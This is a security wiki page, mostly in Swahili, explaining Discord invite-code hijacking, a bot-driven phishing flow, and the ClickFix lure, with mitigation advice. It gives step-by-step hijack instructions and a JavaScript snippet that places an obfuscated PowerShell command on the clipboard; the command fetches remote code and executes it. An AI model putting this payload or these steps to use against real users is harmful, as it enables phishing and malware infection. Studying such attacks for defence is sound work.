# Discord Invite Hijacking

{{#include ../../banners/hacktricks-training.md}}

Udhaifu wa mfumo wa mialiko wa Discord huwawezesha threat actors kudai invite codes zilizo-expire au kufutwa (za muda, za kudumu, au custom vanity) kama vanity links mpya kwenye server yoyote yenye Level 3 Boost. Kwa kubadilisha codes zote kuwa lowercase, attackers wanaweza kujiandikisha mapema kwa invite codes zinazojulikana na kuteka traffic kwa siri mara link ya awali inapo-expire au source server inapopoteza boost yake.<sup>[[1]](#references)[[2]](#references)</sup>

## Invite Types and Hijack Risk

| Invite Type           | Hijackable? | Condition / Comments                                                                                       |
|-----------------------|-------------|------------------------------------------------------------------------------------------------------------|
| Temporary Invite Link | ✅          | Baada ya ku-expire, code huwa inapatikana na inaweza kujiandikishwa tena kama vanity URL na server yenye boost. |
| Permanent Invite Link | ⚠️          | Ikiwa itafutwa na inajumuisha lowercase letters na digits pekee, code inaweza kupatikana tena.        |
| Custom Vanity Link    | ✅          | Ikiwa server ya awali itapoteza Level 3 Boost yake, vanity invite yake huwa inapatikana kwa usajili mpya.    |

## Exploitation Steps

1. Reconnaissance
- Fuatilia vyanzo vya umma (forums, social media, Telegram channels) kwa invite links zinazolingana na pattern ya `discord.gg/{code}` au `discord.com/invite/{code}`.<sup>[[1]](#references)</sup>
- Kusanya invite codes zinazovutia (za muda au vanity).
2. Pre-registration
- Unda au tumia Discord server iliyopo yenye privileges za Level 3 Boost.
- Kwenye **Server Settings → Vanity URL**, jaribu kuweka target invite code. Ikikubaliwa, code itahifadhiwa na malicious server.
3. Hijack Activation
- Kwa temporary invites, subiri hadi invite ya awali i-expire (au ifute mwenyewe ikiwa unadhibiti source).
- Kwa codes zenye uppercase, lowercase variant inaweza kudaiwa mara moja, ingawa redirection huanza kufanya kazi baada ya expiration.
4. Silent Redirection
- Users wanaotembelea link ya zamani watatumwa bila kutambua kwenye server inayodhibitiwa na attacker mara hijack inapoanza kufanya kazi.

## Phishing Flow via Discord Server

1. Zuia server channels ili **#verify** channel pekee ionekane.<sup>[[1]](#references)</sup>
2. Deploy bot (kwa mfano, **Safeguard#0786**) ili kuwaomba newcomers wajithibitishe kupitia OAuth2.
3. Bot huwarudisha users kwenye phishing site (kwa mfano, `captchaguard.me`) kwa kisingizio cha CAPTCHA au hatua ya verification.
4. Tekeleza ujanja wa UX wa **ClickFix**:
- Onyesha ujumbe wa CAPTCHA iliyoharibika.
- Waelekeze users wafungue **Win+R** dialog, wapaste PowerShell command iliyopakiwa mapema, kisha wabonyeze Enter.

### ClickFix Clipboard Injection Example
```javascript
// Copy malicious PowerShell command to clipboard
const cmd = `powershell -NoExit -Command "$r='NJjeywEMXp3L3Fmcv02bj5ibpJWZ0NXYw9yL6MHc0RHa';` +
`$u=($r[-1..-($r.Length)]-join '');` +
`$url=[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($u));` +
`iex (iwr -Uri $url)"`;
navigator.clipboard.writeText(cmd);
```
Mbinu hii huepuka upakuaji wa faili moja kwa moja na hutumia vipengele vya UI vinavyojulikana ili kupunguza mashaka ya mtumiaji.<sup>[[1]](#references)</sup>

## Hatua za Kupunguza Hatari

- Tumia invite links za kudumu zilizo na angalau herufi moja kubwa au character isiyo ya alphanumeric (haziishi muda wake na haziwezi kutumika tena).<sup>[[1]](#references)</sup>
- Badilisha invite codes mara kwa mara na ubatilishe links za zamani.
- Fuatilia hali ya Discord server boost na madai ya vanity URL.
- Waelimishe watumiaji kuthibitisha uhalisi wa server na kuepuka kutekeleza commands zilizopaste kutoka kwenye clipboard.

## Marejeleo

- [1] [Kutoka Imani hadi Tishio: Discord Invites Zilizotekwa Zikitumiwa kwa Usambazaji wa Malware wa Hatua Nyingi](https://research.checkpoint.com/2025/from-trust-to-threat-hijacked-discord-invites-used-for-multi-stage-malware-delivery/)
- [2] [Custom Invite Link – Discord Support](https://support.discord.com/hc/en-us/articles/115001542132-Custom-Invite-Link)

{{#include ../../banners/hacktricks-training.md}}
